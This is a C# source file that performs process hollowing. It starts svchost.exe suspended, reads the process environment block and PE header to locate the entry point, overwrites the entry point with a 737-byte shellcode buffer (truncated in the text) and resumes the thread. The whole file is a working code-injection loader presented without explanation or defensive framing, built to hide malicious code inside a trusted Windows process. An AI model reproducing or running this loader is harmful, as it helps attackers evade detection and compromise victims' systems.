using System;
using System.Runtime.InteropServices;

class Hollowing
{
    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Ansi)]
    struct STARTUPINFO
    {
        public Int32 cb;
        public IntPtr lpReserved, lpDesktop, lpTitle;
        public Int32 dwX, dwY, dwXSize, dwYSize;
        public Int32 dwXCountChars, dwYCountChars, dwFillAttribute, dwFlags;
        public Int16 wShowWindow, cbReserved2;
        public IntPtr lpReserved2, hStdInput, hStdOutput, hStdError;
    }

    [StructLayout(LayoutKind.Sequential)]
    struct PROCESS_INFORMATION
    {
        public IntPtr hProcess, hThread;
        public int dwProcessId, dwThreadId;
    }

    [StructLayout(LayoutKind.Sequential)]
    struct PROCESS_BASIC_INFORMATION
    {
        public IntPtr Reserved1, PebAddress, Reserved2, Reserved3, UniquePid, MoreReserved;
    }

    [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Ansi)]
    static extern bool CreateProcess(string lpApplicationName, string lpCommandLine,
        IntPtr lpProcessAttributes, IntPtr lpThreadAttributes,
        bool bInheritHandles, uint dwCreationFlags,
        IntPtr lpEnvironment, string lpCurrentDirectory,
        [In] ref STARTUPINFO lpStartupInfo,
        out PROCESS_INFORMATION lpProcessInformation);

    [DllImport("ntdll.dll", CallingConvention = CallingConvention.StdCall)]
    private static extern int ZwQueryInformationProcess(IntPtr hProcess, int procInformationClass,
        ref PROCESS_BASIC_INFORMATION procInformation,
        uint ProcInfoLen, ref uint retlen);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern bool ReadProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress,
        [Out] byte[] lpBuffer, int dwSize, out IntPtr lpNumberOfBytesRead);

    [DllImport("kernel32.dll")]
    static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress,
        byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);

    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern uint ResumeThread(IntPtr hThread);

    static void Main()
    {
        // Step 1: Create Suspended Process
        STARTUPINFO si = new STARTUPINFO();
        PROCESS_INFORMATION pi = new PROCESS_INFORMATION();
        bool res = CreateProcess(null, "C:\\Windows\\System32\\svchost.exe",
            IntPtr.Zero, IntPtr.Zero, false, 0x4, IntPtr.Zero, null, ref si, out pi);

        // Step 2: Get PEB / Image Base
        PROCESS_BASIC_INFORMATION bi = new PROCESS_BASIC_INFORMATION();
        uint tmp = 0;
        IntPtr hProcess = pi.hProcess;
        ZwQueryInformationProcess(hProcess, 0, ref bi, (uint)(IntPtr.Size * 6), ref tmp);
        IntPtr ptrToImageBase = (IntPtr)((long)bi.PebAddress + 0x10);

        // Step 3: Read Image Base
        byte[] addrBuf = new byte[IntPtr.Size];
        IntPtr nRead = IntPtr.Zero;
        ReadProcessMemory(hProcess, ptrToImageBase, addrBuf, addrBuf.Length, out nRead);
        IntPtr svchostBase = (IntPtr)(BitConverter.ToInt64(addrBuf, 0));

        // Step 4: Parse EntryPoint
        byte[] data = new byte[0x200];
        ReadProcessMemory(hProcess, svchostBase, data, data.Length, out nRead);
        uint e_lfanew_offset = BitConverter.ToUInt32(data, 0x3C);
        uint opthdr = e_lfanew_offset + 0x28;
        uint entrypoint_rva = BitConverter.ToUInt32(data, (int)opthdr);
        IntPtr addressOfEntryPoint = (IntPtr)(entrypoint_rva + (ulong)svchostBase);

        // Step 5: Write Shellcode
        byte[] buf = new byte[737] {0xfc,0x48,0x83,0xe4,0xf0,0xe8,.......};
        WriteProcessMemory(hProcess, addressOfEntryPoint, buf, buf.Length, out nRead);

        // Step 6: Resume Process
        ResumeThread(pi.hThread);
    }
}
